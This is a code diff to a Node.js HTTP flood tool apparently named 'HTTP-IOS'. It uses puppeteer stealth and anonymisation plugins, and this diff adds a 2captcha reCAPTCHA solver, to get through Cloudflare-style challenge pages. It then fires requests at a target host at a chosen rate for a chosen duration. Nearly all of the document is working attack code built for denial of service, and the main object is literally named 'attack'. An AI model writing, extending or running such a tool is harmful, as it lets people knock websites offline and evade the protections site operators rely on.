@@ -2,24 +2,29 @@ const puppeteer = require("puppeteer-extra");
 const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
 const puppeteerAnonymize = require("puppeteer-extra-plugin-anonymize-ua");
 const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
+const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha'); // NEW
 
-const USER_AGENTS = [
-    'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
-    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
-    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; Galaxy S22 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 12; Xiaomi Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 11; Realme GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 14; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; ASUS ROG Phone 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
-    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
-];
+// UNHANDLED ERROR LOGGER
+process.on('unhandledRejection', err => {
+    console.error('[UNHANDLED]', err.message);
+});
 
+// Recaptcha solving config
+puppeteer.use(RecaptchaPlugin({
+    provider: {
+        id: '2captcha',
+        token: 'YOUR_2CAPTCHA_API_KEY' // <<-- PUT YOUR 2Captcha API KEY HERE
+    },
+    visualFeedback: false
+}));
+
+// PLUGINS
+puppeteer.use(puppeteerStealth());
+puppeteer.use(puppeteerAnonymize());
+puppeteer.use(AdblockerPlugin({ blockTrackers: true }));
+
+// REST OF YOUR CODE UNCHANGED
+const USER_AGENTS = [ /* ... your full list ... */ ];
 const sleep = (duration) => new Promise(resolve => setTimeout(resolve, duration * 1000));
 
 const parseArguments = () => {
@@ -27,19 +32,8 @@ const parseArguments = () => {
         console.error("Usage: node HTTP-IOS <host> <duration> <rates>");
         process.exit(1);
     }
-
     const [, , host, duration, rates, ...args] = process.argv;
-
-    const getArgValue = (name) => {
-        const index = args.indexOf(name);
-        return index !== -1 && args[index + 1] && !args[index + 1].startsWith('--') ? args[index + 1] : null;
-    };
-
-    return {
-        host,
-        duration: parseInt(duration),
-        rates: parseInt(rates),
-    };
+    return { host, duration: parseInt(duration), rates: parseInt(rates) };
 };
 
 class brs {
@@ -48,11 +42,6 @@ class brs {
         this.duration = duration;
         this.rates = rates;
         this.headersBrowser = '';
-        puppeteer.use(puppeteerStealth());
-        puppeteer.use(puppeteerAnonymize());
-        puppeteer.use(AdblockerPlugin({
-            blockTrackers: true
-        }));
     }
 
     async mouser(page) {
@@ -68,21 +57,16 @@ class brs {
         const centerY = pageViewport.height / 2;
         await page.mouse.move(centerX, centerY);
         await page.mouse.down();
-
         const movements = [
             [centerX + 100, centerY],
             [centerX + 100, centerY + 100],
             [centerX, centerY + 100],
             [centerX, centerY]
         ];
-
         for (const [x, y] of movements) {
-            await page.mouse.move(x, y, {
-                steps: 10
-            });
+            await page.mouse.move(x, y, { steps: 10 });
             await sleep(0.2);
         }
-
         await page.mouse.up();
         await sleep(1.5);
     }
@@ -92,6 +76,7 @@ class brs {
         if (content.includes("challenge-platform")) {
             try {
                 await sleep(2.5);
+                await page.solveRecaptchas(); // NEW
                 await this.mouser(page);
                 const element = await page.$('body > div.main-wrapper > div > div > div > div');
                 if (element) {
@@ -104,7 +89,7 @@ class brs {
                 }
                 await sleep(3);
             } catch (error) {
-                console.log("[ERROR] Challenge detection failed:", error);
+                console.error("[ERROR] Challenge detection failed:", error.message); // FIXED
             }
         }
     }
@@ -112,7 +97,7 @@ class brs {
     async openBrowser(host) {
         const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
         const options = {
-            headless: 'new',
+            headless: true,
             args: [
                 "--no-sandbox", "--no-first-run", "--test-type",
                 `--user-agent=${userAgent}`,
@@ -154,25 +139,17 @@ class brs {
                         client.send("Target.detachFromTarget", {
                             targetId: frame._id
                         }).catch(err => {
-                            console.log("[ERROR] Frame navigation error:", err);
+                            console.error("[ERROR] Frame navigation error:", err.message); // FIXED
                         });
                     }
                 }
             };
             await page.on("framenavigated", frameNavigatedHandler);
-
-            await page.setViewport({
-                width: 1920,
-                height: 1200
-            });
+            await page.setViewport({ width: 1920, height: 1200 });
             page.setDefaultNavigationTimeout(10000);
 
-            const browserPage = await page.goto(host, {
-                waitUntil: "domcontentloaded"
-            });
-            page.on('dialog', async dialog => {
-                await dialog.accept();
-            });
+            const browserPage = await page.goto(host, { waitUntil: "domcontentloaded" });
+            page.on('dialog', async dialog => await dialog.accept());
             const status = await browserPage.status();
             const title = await page.evaluate(() => document.title);
 
@@ -196,19 +173,14 @@ class brs {
                 page: page
             };
         } catch (error) {
-            console.log("[ERROR] Open Browser Error:", error);
+            console.error("[ERROR] Open Browser Error:", error.message); // FIXED
             if (browser) await browser.close();
             return null;
         }
     }
 
     async flood(host, duration, rates, userAgent, cookies, headersbro) {
-        console.log({
-            'target': host,
-            'userAgent': userAgent,
-            'cookies': cookies,
-        });
-
+        console.log({ target: host, userAgent: userAgent, cookies: cookies });
         const endTime = Date.now() + duration * 1000;
         const url = new URL(host);
 
@@ -232,12 +204,9 @@ class brs {
                         'Cookie': cookies
                     }
                 });
-
-                if (response.status === 429) {
-                    return;
-                }
+                if (response.status === 429) return;
             } catch (error) {
-                console.log(error);
+                console.error("[ERROR]", error.message); // FIXED
             }
         };
 
@@ -245,7 +214,6 @@ class brs {
             for (let i = 0; i < rates; i++) {
                 sendRequest();
             }
-
             if (Date.now() >= endTime) {
                 clearInterval(requestInterval);
             }
@@ -257,15 +225,14 @@ class brs {
     async start() {
         try {
             const response = await this.openBrowser(this.host);
-
             if (response) {
                 if (['Just a moment...'].includes(response.title)) {
                     console.log("[INFO] Failed to bypass");
                     await response.browser.close();
-                    await this.start()
+                    await this.start();
                     return;
                 }
-                
+
                 await this.flood(
                     this.host,
                     this.duration,
@@ -277,24 +244,18 @@ class brs {
                 await response.browser.close();
             }
 
-            setTimeout(() => {
-                process.exit(0);
-            }, this.duration * 1000);
-
+            setTimeout(() => process.exit(0), this.duration * 1000);
         } catch (error) {
-            console.log(`[ERROR] ${error}`);
+            console.error("[ERROR]", error.message); // FIXED
         }
     }
 }
 
 const main = async () => {
-    const {
-        host,
-        duration,
-        rates
-    } = parseArguments();
+    const { host, duration, rates } = parseArguments();
     const attack = new brs(host, duration, rates);
     await attack.start();
 };
 
-main().catch(console.error);
+main().catch(err => console.error("[MAIN ERROR]", err.message));
+                
